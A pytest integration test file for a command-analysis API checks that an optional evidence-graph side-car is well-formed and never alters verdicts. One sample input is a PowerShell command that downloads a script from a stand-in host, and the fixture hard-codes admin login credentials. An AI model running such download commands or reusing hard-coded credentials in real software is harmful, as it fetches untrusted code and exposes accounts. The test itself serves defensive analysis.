"""Phase 11.0/11.1 · Evidence Graph exposure on /api/rc5/parse.

Preview-only integration test — verifies the side-car is:
* Absent from the response when `NIVX_EVIDENCE_GRAPH` is off.
* Present and well-formed when set to `sidecar`.
* Never a verdict driver (verdict remains identical to non-sidecar run).
"""
import json
import os
import sys

import pytest
from fastapi.testclient import TestClient


@pytest.fixture(scope="module")
def _fresh_env():
    os.environ["RC5_DIAG_ENABLED"] = "true"
    os.environ["ADMIN_EMAIL"] = "admin@nivxray.com"
    os.environ["ADMIN_PASSWORD"] = "uulVDp5cCSB3Hva99s7UUAwK"
    os.environ.setdefault("JWT_SECRET", "test-jwt-secret-do-not-use-in-prod")
    os.environ.setdefault("EMERGENT_LLM_KEY", "test-key")
    os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
    os.environ.setdefault("DB_NAME", "test_nivxray")


def _mk_client(monkeypatch, mode: str):
    if mode:
        monkeypatch.setenv("NIVX_EVIDENCE_GRAPH", mode)
    else:
        monkeypatch.delenv("NIVX_EVIDENCE_GRAPH", raising=False)
    for mod in ("deps", "server"):
        if mod in sys.modules:
            del sys.modules[mod]
    from server import app
    return TestClient(app)


def _login(client) -> str:
    r = client.post("/api/auth/login", json={
        "email": os.environ["ADMIN_EMAIL"],
        "password": os.environ["ADMIN_PASSWORD"],
    })
    assert r.status_code == 200, r.text
    return r.json()["token"]


def test_evidence_graph_absent_when_flag_off(_fresh_env, monkeypatch):
    with _mk_client(monkeypatch, "") as c:
        token = _login(c)
        r = c.post(
            "/api/rc5/parse",
            headers={"Authorization": f"Bearer {token}"},
            json={"input": "cmd /c echo hi", "language": "cmd"},
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body.get("evidence_graph") is None
        assert body.get("evidence_graph_metrics") is None


def test_evidence_graph_present_and_wellformed_when_sidecar(_fresh_env, monkeypatch):
    with _mk_client(monkeypatch, "sidecar") as c:
        token = _login(c)
        r = c.post(
            "/api/rc5/parse",
            headers={"Authorization": f"Bearer {token}"},
            json={"input": "powershell -c iwr http://x.example/a.ps1", "language": "powershell"},
        )
        assert r.status_code == 200, r.text
        body = r.json()
        eg = body["evidence_graph"]
        assert eg is not None
        assert set(eg.keys()) == {"schema_version", "nodes", "edges"}
        assert eg["schema_version"] == 1
        # At least the synthetic root + one real entity.
        assert len(eg["nodes"]) >= 2
        # Every node/edge must carry the correct ID prefix.
        for n in eg["nodes"]:
            assert n["id"].startswith("eg_") and len(n["id"]) == 19
        for e in eg["edges"]:
            assert e["id"].startswith("ee_") and len(e["id"]) == 19


def test_evidence_graph_does_not_influence_verdict(_fresh_env, monkeypatch):
    payload = {"input": "cmd /c echo hi", "language": "cmd"}
    # First: sidecar OFF.
    with _mk_client(monkeypatch, "") as c:
        token = _login(c)
        r_off = c.post(
            "/api/rc5/parse",
            headers={"Authorization": f"Bearer {token}"},
            json=payload,
        )
        assert r_off.status_code == 200
    body_off = r_off.json()

    # Then: sidecar ON.
    with _mk_client(monkeypatch, "sidecar") as c:
        token = _login(c)
        r_on = c.post(
            "/api/rc5/parse",
            headers={"Authorization": f"Bearer {token}"},
            json=payload,
        )
        assert r_on.status_code == 200
    body_on = r_on.json()

    # Verdict, MITRE, LOLBIN, behaviours, explainability MUST be identical.
    for k in ("verdict_v2", "mitre", "lolbins_v2", "behaviors", "explain",
              "confidence_summary", "exec_graph"):
        assert body_off[k] == body_on[k], (
            f"non-influence violated: field {k!r} differs between "
            f"sidecar off and on"
        )


def test_status_endpoint_reports_evidence_graph_mode(_fresh_env, monkeypatch):
    with _mk_client(monkeypatch, "sidecar") as c:
        token = _login(c)
        r = c.get(
            "/api/rc5/status",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert r.status_code == 200
        body = r.json()
        assert body["evidence_graph"]["mode"] == "sidecar"
        assert body["evidence_graph"]["schema_version"] == 1
